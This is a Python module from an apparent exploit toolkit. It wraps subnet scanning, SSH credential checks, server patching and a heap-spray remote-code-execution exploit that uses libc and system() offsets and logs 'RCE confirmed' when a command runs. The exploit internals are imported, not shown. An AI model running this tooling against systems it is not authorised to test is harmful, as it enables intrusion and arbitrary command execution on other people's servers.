"""automation/auto.py — auto_scan, auto_patch, auto_exploit."""
from __future__ import annotations

from config import DEFAULT_HEAP_BASE, DEFAULT_LIBC_BASE, DEFAULT_SYSTEM_OFFSET, DEFAULT_HEAP_OFFSETS
from core.exploit import mode_exploit, ExploitResult
from recon.scanner import detect_service, scan_subnet, scan_ssh
from patch.apply import patch_server
from ui.output import generate_html_scan_report, generate_json_report, print_scan_results

import sys

def _log(msg: str, level: str = "info"):
    from datetime import datetime
    ts = datetime.now().strftime("%H:%M:%S")
    prefix = {"info": "[*]", "ok": "[+]", "warn": "[!]", "err": "[-]"}
    print(f"{ts} {prefix.get(level,'[*]')} {msg}", file=sys.stderr)


def auto_scan(subnet: str, port: int, user: str = "root",
              password: str | None = None, key_path: str | None = None,
              output: str | None = None) -> list[dict]:
    _log(f"Auto-scan: {subnet} port {port}", "info")
    live_hosts = scan_subnet(subnet, port)
    results = []
    for h in live_hosts:
        svc = detect_service(h, port, vhost=h)
        if svc.get("alive"):
            if password or key_path:
                ssh = scan_ssh(h, port=22, user=user, password=password, key_path=key_path)
                svc.update(ssh)
            results.append(svc)

    if output:
        if output.endswith(".json"):
            generate_json_report({"scan_results": results}, output)
        elif output.endswith(".html"):
            generate_html_scan_report(results, output)

    print_scan_results(results)
    return results


def auto_patch(subnet: str, port: int, user: str = "root",
               password: str | None = None, key_path: str | None = None,
               dry_run: bool = False) -> list[dict]:
    _log(f"Auto-patch: {subnet}", "info")
    live = scan_subnet(subnet, port)
    results = []
    for h in live:
        r = patch_server(h, port, user, password, key_path, dry_run)
        results.append(r)
        _log(f"{h}: {r['status']}", "ok" if r["status"] == "patched" else "err")
    return results


def auto_exploit(host: str, port: int, cmd: str, heap_base: int = 0,
                 libc_base: int = 0, system_off: int = DEFAULT_SYSTEM_OFFSET,
                 offsets: list[int] | None = None,
                 vhost: str = "l", use_ssl: bool = False,
                 spray_path: str = None) -> ExploitResult:
    hb  = heap_base or DEFAULT_HEAP_BASE
    lb  = libc_base or DEFAULT_LIBC_BASE
    off = offsets   or DEFAULT_HEAP_OFFSETS
    _log(f"Auto-exploit: {host}:{port} vhost={vhost} ssl={use_ssl} cmd='{cmd}'", "info")
    result = mode_exploit(host, port, cmd, hb, lb, system_off, off, 10, vhost=vhost, use_ssl=use_ssl, spray_path=spray_path)
    if result.success:
        _log(f"RCE confirmed! system('{cmd}') executed", "ok")
    else:
        _log(f"Exploit failed: {result.error or 'no crash detected'}", "err")
    return result
